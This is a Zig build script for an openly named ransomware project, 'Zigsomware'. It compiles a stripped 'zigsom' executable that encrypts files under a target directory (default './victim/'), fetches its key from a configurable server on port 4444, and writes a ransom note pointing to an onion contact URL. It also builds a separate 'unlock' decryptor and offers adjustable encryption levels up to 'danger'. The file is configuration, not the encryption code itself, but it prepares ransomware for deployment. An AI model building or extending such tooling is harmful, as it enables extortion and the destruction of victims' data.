const std = @import("std");
const Build = std.Build;

pub fn build(b: *Build) !void {
    const target = b.standardTargetOptions(.{});
    const optimize = .ReleaseSmall;

    // Build options
    const opt_dir = b.option(
        []const u8,
        "dir",
        "Path of the directory to start encryption. (default: './victim/')",
    ) orelse "./victim/";
    const opt_server_host = b.option(
        []const u8,
        "server_host",
        "Server address",
    ) orelse "127.0.0.1";
    const opt_server_port = b.option(
        u16,
        "server_port",
        "Server port",
    ) orelse 4444;
    const opt_server_path = b.option(
        []const u8,
        "server_path",
        "The URL path of the server to download the encryption key",
    ) orelse "/";
    const opt_contact_url = b.option(
        []const u8,
        "contact_url",
        "Your website URL such as Onion URL, that will be written in the ransom note",
    ) orelse "http://xxxxxxxxxxxxxxxxxxxxxxxxxxx.onion";
    const opt_level = b.option(
        usize,
        "level",
        "The level at which Zigsomware encrypts files. The higher the level, the more files will be encrypted. [1: safe, 2: normal, 3: danger] (default: 1)",
    ) orelse 1;

    // Validate options
    if (!std.mem.startsWith(u8, opt_server_path, "/")) {
        std.log.err("The '-Dserver_path' must be started with '/'.\n", .{});
        return error.InvalidServerPath;
    }
    if (opt_level < 1 or 3 < opt_level) {
        std.log.err("The '-Dlevel' must be between 1 and 3.\n", .{});
        return error.InvalidLevel;
    }

    const opts = b.addOptions();
    opts.addOption([]const u8, "dir", opt_dir);
    opts.addOption([]const u8, "server_host", opt_server_host);
    opts.addOption(u16, "server_port", opt_server_port);
    opts.addOption([]const u8, "server_path", opt_server_path);
    opts.addOption([]const u8, "contact_url", opt_contact_url);
    opts.addOption(usize, "level", opt_level);

    // "zigsom"
    const exe_zigsom = b.addExecutable(.{
        .name = "zigsom",
        .root_source_file = b.path("src/zigsom.zig"),
        .target = target,
        .optimize = optimize,
        .link_libc = true,
        .strip = true,
    });
    // Embed build options
    exe_zigsom.root_module.addOptions("build_options", opts);
    b.installArtifact(exe_zigsom);

    // "unlock"
    const exe_unlock = b.addExecutable(.{
        .name = "unlock",
        .root_source_file = b.path("src/unlock.zig"),
        .target = target,
        .optimize = optimize,
        .link_libc = true,
        .strip = true,
    });
    exe_unlock.root_module.addImport("clap", b.dependency("clap", .{}).module("clap"));
    b.installArtifact(exe_unlock);
}
